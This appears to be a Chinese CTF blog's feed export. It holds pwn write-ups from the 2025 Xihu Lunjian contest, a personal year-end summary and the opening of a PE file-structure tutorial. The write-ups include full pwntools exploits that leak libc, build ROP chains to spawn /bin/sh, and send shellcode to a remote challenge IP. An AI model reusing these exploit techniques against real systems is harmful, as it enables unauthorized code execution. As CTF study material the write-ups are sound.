class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004013f4</span>pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x00000000004013f6</span>pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x00000000004013f8</span>ret <span class="token operator">=</span> <span class="token number">0x00000000004007fe</span>binsh <span class="token operator">=</span> <span class="token number">0x00000000004019d7</span>syscall <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'alarm'</span><span class="token punctuation">]</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'!'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x2568</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'increase.'</span><span class="token punctuation">,</span> <span class="token string">b'5'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'increase.'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x602058</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'3'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x7</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">7</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;bypass&quot;&gt;&lt;a href=&quot;#bypass&quot; class=&quot;headerlink&quot; title=&quot;bypass&quot;&gt;&lt;/a&gt;bypass&lt;/h2&gt;&lt;p&gt;main 函数中输入格式不正确的时候会输出 puts 函数地址，泄露 libc 地址，输入长度为 4 内容为</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2025西湖论剑-PWN</title>
    <link href="https://starrysky1004.github.io/2025/01/18/2025-xi-hu-lun-jian-pwn/2025-xi-hu-lun-jian-pwn/"/>
    <id>https://starrysky1004.github.io/2025/01/18/2025-xi-hu-lun-jian-pwn/2025-xi-hu-lun-jian-pwn/</id>
    <published>2025-01-18T11:01:11.000Z</published>
    <updated>2025-01-18T11:23:47.148Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Vpwn"><a href="#Vpwn" class="headerlink" title="Vpwn"></a>Vpwn</h2><p>使用 c++ 的 vector 通过菜单选择对 vector 进行 push、pop、edit、show 操作，vector 容器中每个元素占 4 位，第六个元素存放了元素的个数</p><p>在 push 操作中会将元素个数 +1</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">__int64 __fastcall add(__int64 vec, int *index)&#123;  int idx; &#x2F;&#x2F; ecx  __int64 num; &#x2F;&#x2F; rax  idx &#x3D; *index;  num &#x3D; *(_QWORD *)(vec + 24);  *(_QWORD *)(vec + 24) &#x3D; num + 1;  *(_DWORD *)(vec + 4 * num) &#x3D; idx;  return num;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而在 edit 的时候判断下标是否合法的依据就是第六位的元素个数</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">__int64 __fastcall get_edit_addr(__int64 vec, unsigned __int64 index)&#123;  std::out_of_range *exception; &#x2F;&#x2F; rbx  if ( index &gt;&#x3D; *(_QWORD *)(vec + 24) )  &#123;    exception &#x3D; (std::out_of_range *)__cxa_allocate_exception(0x10uLL);    std::out_of_range::out_of_range(exception, &quot;Index out of range&quot;);    __cxa_throw(      exception,      (struct type_info *)&amp;&#96;typeinfo for&#39;std::out_of_range,      (void (*)(void *))&amp;std::out_of_range::~out_of_range);  &#125;  return 4 * index + vec;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时 show 操作输出的元素个数也是 vector 第六位的元素数量</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">__int64 __fastcall show(__int64 vec)&#123;  __int64 v1; &#x2F;&#x2F; rax  unsigned __int64 i; &#x2F;&#x2F; [rsp+18h] [rbp-8h]  std_cout(&amp;cout, &quot;StackVector contents: &quot;);  for ( i &#x3D; 0LL; i &lt; *(_QWORD *)(vec + 24); ++i )  &#123;    v1 &#x3D; std::ostream::operator&lt;&lt;(&amp;cout, *(unsigned int *)(vec + 4 * i));    std_cout(v1, &quot; &quot;);  &#125;  return std::ostream::operator&lt;&lt;(&amp;cout, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是程序是 64 位的，所以实际在取元素数量的时候是和前一位拼接起来取 8 位的，例如前一位是 00000008，第六位是 00000008，那么实际取的大小就是800000008，这样就可以越界写栈内存以及越界 show 了，但是 show 的时候会一直输出到元素数量这么长，就会读到不存在的内存造成 eof，所以还需要控制这个大小，之后就能正常输出栈内存泄露 libc 以及在返回地址写 rop 了</p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'139.155.126.78'</span><span class="token punctuation">,</span> <span class="token number">23091</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'push'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'edit'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'value'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'StackVector contents: '</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>num1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>num2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> num2 <span class="token operator">*</span> <span class="token number">0x100000000</span> <span class="token operator">+</span> num1 <span class="token operator">-</span> <span class="token number">0x29d90</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.35/libc.so.6'</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x2a3e5</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>head <span class="token operator">=</span> <span class="token punctuation">(</span>libc_base <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>edit<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>pop_rdi_ret <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">,</span> head<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> pop_rdi_ret <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">,</span> head<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span> binsh <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">,</span> head<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span> system <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> head<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'5'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Heaven’s-door"><a href="#Heaven’s-door" class="headerlink" title="Heaven’s door"></a>Heaven’s door</h2><p>非预期直接发shellcode</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'139.155.126.78'</span><span class="token punctuation">,</span> <span class="token number">22502</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Vpwn&quot;&gt;&lt;a href=&quot;#Vpwn&quot; class=&quot;headerlink&quot; title=&quot;Vpwn&quot;&gt;&lt;/a&gt;Vpwn&lt;/h2&gt;&lt;p&gt;使用 c++ 的 vector 通过菜单选择对 vector 进行 push、pop、edit、show 操作，vector</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2024年终总结</title>
    <link href="https://starrysky1004.github.io/2025/01/02/2024-nian-zhong-zong-jie/"/>
    <id>https://starrysky1004.github.io/2025/01/02/2024-nian-zhong-zong-jie/</id>
    <published>2025-01-02T08:45:26.000Z</published>
    <updated>2025-01-02T10:38:17.672Z</updated>
    
    <content type="html"><![CDATA[<p>今年学的东西很零散，PWN、WEB、RW、渗透、web开发都有接触，感觉有点学习思路混乱导致浪费了很多时间，但也算有所收获：在beginctf、sictf、羊城杯、源鲁杯中学到一些pwn的新知识，例如侧信道、llvm pass、protobuf；在长城杯和上海大学生市赛的实践中学会了awd赛制的打法和批量脚本的编写；在basectf和moectf中学了一个月的web基础；学了半个月kernel基础；跟着z1r0师傅复现了一些cve并且跟着参与了漏洞挖掘实战，学到了IDA动调和windbg动调；年底开始接触RW，目前也就学了一些angr、afl基础用法、IoT基础知识、pe文件结构、压缩注入。这一年的学习过程中很感谢<a href="https://www.cnblogs.com/ve1kcon#/">ve1</a>宝和<a href="https://www.z1r0.top/">z1r0</a>师傅的指导，在我不知道该怎么继续的时候一直是他们在给我鼓励带着我往前。</p><p>这一年也有很多新奇的经历，去了青岛、广州、长沙、上海、北京、贵阳、西安、华山，第一次在网吧过夜，第一次自己一个人坐火车，久违的和妈妈一起去旅游。大学最大的收获除了网安就是长了很多见识，去了很多城市；接任了校队队长之后也学会了团队协作管理，包括在招新的过程中遇到各种各样的人和问题，对于社恐的我来说还挺有挑战性的。年初的时候一时兴起做起了up主，没想到真的有很多人会关注我，现在也有2.4k粉丝啦，也由此认识了一些师傅，在和他们的交流中学到了很多，下半年开始了《重生之我在yctu做pwn手》系列，pwn方向入门感觉挺难的，希望能帮助以后开始学pwn的师傅入门。年初的时候还加入了联队0xFFF，联队的师傅们真的好强啊，对我来说觉得很难很难的比赛很多都是联队的师傅们在出题。</p><p>还有最开心的事就是认识了ve1宝，在香山杯的时候被ve1宝注意到，然后在长城杯第一次面基拍了个合照，以为以后不会有什么交集呢，后来在机缘巧合下又聊了起来，感觉ve1宝真的超级温柔欸，会为我考虑能理解我的感受，而且还是大帅哥，花痴ing（x。再次见面是在上海市赛，和ve1宝在上海玩了一天，外滩那家蟹黄面真好吃aaa，后来ve1宝去北京实习啦，还路过盐城找我玩了几天，大三课少，拼拼凑凑假期多的时候我也去了几次北京，和ve1宝双排打比赛，谁懂啊，有个方向一致志同道合的对象感觉真的超棒！后面青岛和贵阳的比赛ve1宝还特地飞来找我玩，一起去看了很多风景。</p><p>2025的计划就是继续学pwn，多接触一些其他知识拓宽知识面，重点放在RW的学习，希望2025能找到一份合适的实习，CTF水平能配得上战队，还有能和我的ve1宝一直好好的欸嘿。</p><p>最后放点今年拍的照片~</p><img src="/2025/01/02/2024-nian-zhong-zong-jie/1.jpg" class><img src="/2025/01/02/2024-nian-zhong-zong-jie/2.jpg" class><img src="/2025/01/02/2024-nian-zhong-zong-jie/3.jpg" class><img src="/2025/01/02/2024-nian-zhong-zong-jie/4.jpg" class><img src="/2025/01/02/2024-nian-zhong-zong-jie/5.jpg" class><img src="/2025/01/02/2024-nian-zhong-zong-jie/6.jpg" class>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今年学的东西很零散，PWN、WEB、RW、渗透、web开发都有接触，感觉有点学习思路混乱导致浪费了很多时间，但也算有所收获：在beginctf、sictf、羊城杯、源鲁杯中学到一些pwn的新知识，例如侧信道、llvm pass、protobuf；在长城杯和上海大学生市赛的实</summary>
      
    
    
    
    
    <category term="年终总结" scheme="https://starrysky1004.github.io/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>PE文件结构与压缩注入</title>
    <link href="https://starrysky1004.github.io/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/"/>
    <id>https://starrysky1004.github.io/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/</id>
    <published>2024-12-16T16:37:42.834Z</published>
    <updated>2024-12-19T08:45:55.857Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="PE文件结构"><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h2><p>PE : Portable Executable 可移植的可执行文件，Windows 操作系统下的可执行文件（exe，scr）、动态链接库（dll，oxc，cpl）、驱动程序（sys，vxd）的总称</p><h3 id="DOS头：DOS-Header-DOS-Stub"><a href="#DOS头：DOS-Header-DOS-Stub" class="headerlink" title="DOS头：DOS Header + DOS Stub"></a>DOS头：DOS Header + DOS Stub</h3><p><strong>DOS Header</strong> 结构体（0x40），用于向后兼容早期的 MS-DOS</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_DOS_HEADER</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// DOS .EXE 文件头结构体</span>    WORD   e_magic<span class="token punctuation">;</span>                     <span class="token comment">// 标识符，用于确认这是MZ格式的文件，值为0x5A4D</span>    WORD   e_cblp<span class="token punctuation">;</span>                      <span class="token comment">// 文件中最后一个扇区的字节数</span>    WORD   e_cp<span class="token punctuation">;</span>                        <span class="token comment">// 文件中的扇区总数</span>    WORD   e_crlc<span class="token punctuation">;</span>                      <span class="token comment">// 重定位表中的条目数</span>    WORD   e_cparhdr<span class="token punctuation">;</span>                   <span class="token comment">// 文件头的大小，以16字节为单位</span>    WORD   e_minalloc<span class="token punctuation">;</span>                  <span class="token comment">// 程序加载时所需的最小额外内存段落数</span>    WORD   e_maxalloc<span class="token punctuation">;</span>                  <span class="token comment">// 程序加载时所需的最大额外内存段落数</span>    WORD   e_ss<span class="token punctuation">;</span>                        <span class="token comment">// 初始堆栈段选择子（段地址）</span>    WORD   e_sp<span class="token punctuation">;</span>                        <span class="token comment">// 初始堆栈指针值</span>    WORD   e_csum<span class="token punctuation">;</span>                      <span class="token comment">// 校验和，用于检验文件的完整性</span>    WORD   e_ip<span class="token punctuation">;</span>                        <span class="token comment">// 初始指令指针（IP值）</span>    WORD   e_cs<span class="token punctuation">;</span>                        <span class="token comment">// 初始代码段选择子（段地址）</span>    WORD   e_lfarlc<span class="token punctuation">;</span>                    <span class="token comment">// 文件中重定位表的偏移量</span>    WORD   e_ovno<span class="token punctuation">;</span>                      <span class="token comment">// 覆盖号，用于实现覆盖功能</span>    WORD   e_res<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token comment">// 保留字段，供未来使用</span>    WORD   e_oemid<span class="token punctuation">;</span>                     <span class="token comment">// OEM标识符，用于特定于OEM的扩展</span>    WORD   e_oeminfo<span class="token punctuation">;</span>                   <span class="token comment">// OEM信息，供OEM使用</span>    WORD   e_res2<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                  <span class="token comment">// 保留字段，供未来扩展使用</span>    LONG   e_lfanew<span class="token punctuation">;</span>                    <span class="token comment">// 指向新EXE（PE）头的偏移量，从文件开始处计算</span><span class="token punctuation">&#125;</span> IMAGE_DOS_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_DOS_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点关注：</p><ul><li>e_magic：位于文件首，确认是 MZ 格式文件，对应 ascii 的 MZ </li><li>e_lfanew：PE 头偏移地址，e_lfanew &#x3D; 80，对应 0080h 处</li></ul><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212181546947.png" class><p><strong>DOS Stub</strong> 编译器自动生成，由代码和数据混合而成，大小不固定，在不支持 PE 文件格式的操作系统中会显示一个错误提示，在 Windows 中不运行，在 DOS 中会运行</p><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212181643899.png" class><h3 id="PE-头：-NT-头-节表区"><a href="#PE-头：-NT-头-节表区" class="headerlink" title="PE 头： NT 头 + 节表区"></a>PE 头： NT 头 + 节表区</h3><h4 id="NT头"><a href="#NT头" class="headerlink" title="NT头"></a>NT头</h4><p>PE 文件的核心部分，包含关于可执行文件的重要信息。开始位置由 e_lfanew 指定</p><p>32位中 NT 结构体 _IMAGE_NT_HEADERS 如下（0xf8）：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_NT_HEADERS</span> <span class="token punctuation">&#123;</span>    DWORD Signature<span class="token punctuation">;</span>  <span class="token comment">// PE签名，0x4字节</span>    IMAGE_FILE_HEADER FileHeader<span class="token punctuation">;</span>  <span class="token comment">// PE头，0x14字节</span>    IMAGE_OPTIONAL_HEADER32 OptionalHeader<span class="token punctuation">;</span>  <span class="token comment">// PE可选头</span><span class="token punctuation">&#125;</span> IMAGE_NT_HEADERS32<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_NT_HEADERS32<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PE 头结构体 _IMAGE_FILE_HEADER 如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token 